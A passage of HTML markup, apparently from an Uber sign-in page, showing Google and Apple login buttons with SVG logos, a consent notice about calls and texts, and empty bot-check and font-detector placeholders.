                                  ><div class="flex box-border items-center justify-center [-webkit-box-pack:center] [-webkit-box-align:center] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                    ><div class="flex mr-[8px] box-border items-center [-webkit-box-align:center] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                      ><svg width="18" height="18" viewBox="0 0 256 262" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid" class="h-[20px] w-[20px] box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                        ><path d="M255.9 133.5c0-10.8-.9-18.6-2.8-26.7H130.6v48.4h71.9a63.8 63.8 0 01-26.7 42.4l-.2 1.6 38.7 30 2.7.3c24.7-22.8 38.9-56.3 38.9-96" fill="#4285F4" class="box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                          ></path
                                          ><path d="M130.6 261.1c35.2 0 64.8-11.6 86.4-31.6l-41.2-32c-11 7.8-25.8 13.1-45.2 13.1a78.6 78.6 0 01-74.3-54.2l-1.5.1-40.3 31.2-.6 1.5C35.4 231.8 79.5 261 130.6 261" fill="#34A853" class="box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                          ></path
                                          ><path d="M56.3 156.4a80.4 80.4 0 01-.2-51.7V103L15.3 71.3l-1.4.6a130.7 130.7 0 000 117.3l42.4-32.8" fill="#FBBC05" class="box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                          ></path
                                          ><path d="M130.6 50.5c24.5 0 41 10.6 50.4 19.4L218 34C195.2 13 165.8 0 130.6 0 79.5 0 35.4 29.3 13.9 72l42.2 32.7a79 79 0 0174.4-54.2" fill="#EB4335" class="box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                          ></path
                                          ></svg
                                        ></div
                                      ><div class="flex flex-col box-border text-center [align-items:start] [-webkit-box-align:start] [-webkit-box-orient:vertical] [-webkit-box-direction:normal] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                      ><p class="m-0 box-border leading-[20px] [font-size:16px] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                        >Continue with Google</p
                                        ></div
                                      ></div
                                    ></div
                                  ><div class="flex box-border items-center [-webkit-box-align:center] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                  ></div
                                  ></div
                                ></button
                              ></div
                            ></div
                          ><div class="box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                          ><div class="w-full relative box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                            ><button id="apple-login-btn" class="m-0 flex w-full px-[16px] py-[14px] box-border shadow-none font-medium ease-linear items-center min-h-[48px] rounded-[8px] [border:none] cursor-pointer leading-[20px] [outline:none] duration-[0.2s] [font-size:16px] text-[oklch(0%0_none)] transition-[background] [-webkit-box-align:center] [background:oklch(93.1%0_none)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] focus-visible:shadow-[inset_0_0_0_3px_oklch(57.3%0.20954_261.36)] disabled:cursor-not-allowed disabled:text-[oklch(72.516%0_none)] disabled:[background:oklch(96.415%0_none)] hover:[background:oklch(89.755%0_none)] active:[background:oklch(79.207%0_none)]"
                              ><div class="flex w-full box-border items-center justify-between [-webkit-box-pack:justify] [-webkit-box-align:center] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                ><div class="flex box-border items-center [-webkit-box-align:center] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                  ></div
                                  ><div class="flex box-border items-center [-webkit-box-align:center] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                  ><div class="flex box-border items-center justify-center [-webkit-box-pack:center] [-webkit-box-align:center] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                    ><div class="flex mr-[8px] box-border items-center [-webkit-box-align:center] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                      ><svg width="22" height="22" viewBox="0 0 22 22" fill="#000000" xmlns="http://www.w3.org/2000/svg" class="h-[20px] w-[20px] box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                        ><g transform="matrix( 1 0 0 1 3 1 )" class="box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                          ><path fill-rule="evenodd" clip-rule="evenodd" d="M11.2676 3.23104C11.9166 2.39314 12.4087 1.20886 12.2307 0C11.1698 0.0737252 9.92984 0.752465 9.2063 1.63717C8.54675 2.43878 8.00468 3.63126 8.21639 4.78863C9.37613 4.8249 10.5731 4.12978 11.2676 3.23104ZM17 14.6022C16.5359 15.6367 16.3125 16.099 15.7146 17.0153C14.8806 18.2943 13.7046 19.887 12.2459 19.8987C10.9512 19.9128 10.6173 19.0503 8.85967 19.0608C7.10203 19.0702 6.73561 19.9151 5.4386 19.9022C3.98106 19.8894 2.86668 18.4523 2.03264 17.1732C-0.300809 13.5993 -0.546251 9.404 0.892672 7.17235C1.91632 5.58785 3.53089 4.66101 5.04775 4.66101C6.59136 4.66101 7.56267 5.51295 8.84106 5.51295C10.0811 5.51295 10.836 4.65867 12.6216 4.65867C13.9733 4.65867 15.4052 5.39944 16.4242 6.67734C13.0834 8.5193 13.6243 13.3185 17 14.6022Z" fill="#000000" opacity="1" class="box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                            ></path
                                            ></g
                                          ></svg
                                        ></div
                                      ><div class="flex flex-col box-border text-center [align-items:start] [-webkit-box-align:start] [-webkit-box-orient:vertical] [-webkit-box-direction:normal] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                      ><p class="m-0 box-border leading-[20px] [font-size:16px] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                        >Continue with Apple</p
                                        ></div
                                      ></div
                                    ></div
                                  ><div class="flex box-border items-center [-webkit-box-align:center] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                  ></div
                                  ></div
                                ></button
                              ></div
                            ></div
                          ></div
                        ></div
                      ></div
                    ><div class="box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                    ><div class="h-[16px] box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                      ></div
                      ></div
                    ><div class="mb-[24px] box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                    ></div
                    ><p id="formFooterPhone" class="mt-0 mx-0 mb-[8px] pr-[16px] box-border leading-[20px] [font-size:12px] text-[oklch(48.193%0_none)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                    >By continuing, you agree to calls, including by autodialer, WhatsApp, or texts from Uber and its affiliates.</p
                    ></div
                  ></div
                ></div
              ></div
            ></div
          ></div
        ><div class="flex fixed top-0 flex-col pt-[12px] inset-x-0 box-border items-center justify-start [-webkit-box-pack:start] [-webkit-box-align:center] [-webkit-box-orient:vertical] [-webkit-box-direction:normal] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
        ></div
        ><div class="fixed z-[2] hidden h-full w-full inset-0 box-border [background-color:oklch(0%0_none/.5)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
        ></div
        ><div id="loading_component" class="hidden h-full w-full z-[100] absolute box-border opacity-70 items-center justify-center [-webkit-box-pack:center] [-webkit-box-align:center] [background-color:oklch(100%0_none)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
        ><div class="h-[40px] w-[40px] box-border rounded-[50%] [animation-name:ae] [animation-duration:1s] [animation-timing-function:linear] [animation-iteration-count:infinite] [border:6px_solid_oklch(96.415%0_none)] [&]:[border-top-color:oklch(57.3%0.20954_261.36)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
          ></div
          ></div
        ><div class="hidden box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
        ><div id="bottom-modal-content" class="m-[16px] box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
          ><div class="h-0 w-0 top-0 z-[-1] left-0 absolute box-border overflow-hidden [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
            ><div id="arkose-challenge" tabindex="-1" class="box-border [outline:none] ![max-width:100%] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
              ></div
              ></div
            ></div
          ></div
        ></div
      ><div class="box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
      ></div
      ></div
    >















            <div id="inauth_font_detector" class="top-0 absolute invisible box-border left-[-999px] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
    ></div
    ></body
  ></html
>